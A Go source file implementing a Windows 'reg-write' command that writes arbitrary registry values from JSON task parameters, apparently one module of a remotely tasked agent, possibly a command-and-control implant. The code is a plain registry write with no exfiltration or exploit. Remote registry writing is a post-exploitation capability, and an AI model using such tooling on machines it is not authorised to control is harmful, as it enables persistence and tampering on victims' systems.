//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

// RegWriteCommand implements the reg-write command
type RegWriteCommand struct{}

func (c *RegWriteCommand) Name() string        { return "reg-write" }
func (c *RegWriteCommand) Description() string { return "Write a value to the Windows Registry" }

// RegWriteParams represents the JSON parameters
type RegWriteParams struct {
	Hive    string `json:"hive"`
	Path    string `json:"path"`
	Name    string `json:"name"`
	Data    string `json:"data"`
	RegType string `json:"reg_type"`
}

func (c *RegWriteCommand) Execute(task structs.Task) structs.CommandResult {
	var params RegWriteParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.Path == "" {
		return structs.CommandResult{
			Output:    "Error: registry path is required",
			Status:    "error",
			Completed: true,
		}
	}

	hiveKey, err := parseHive(params.Hive)
	if err != nil {
		return structs.CommandResult{
			Output:    err.Error(),
			Status:    "error",
			Completed: true,
		}
	}

	key, _, err := registry.CreateKey(hiveKey, params.Path, registry.SET_VALUE)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error opening/creating key %s\\%s: %v", params.Hive, params.Path, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer key.Close()

	if err := parseRegWriteValue(key, params.Name, params.Data, params.RegType); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error writing value: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	displayName := params.Name
	if displayName == "" {
		displayName = "(Default)"
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Successfully wrote %s\\%s\\%s = %s [%s]", params.Hive, params.Path, displayName, params.Data, params.RegType),
		Status:    "completed",
		Completed: true,
	}
}
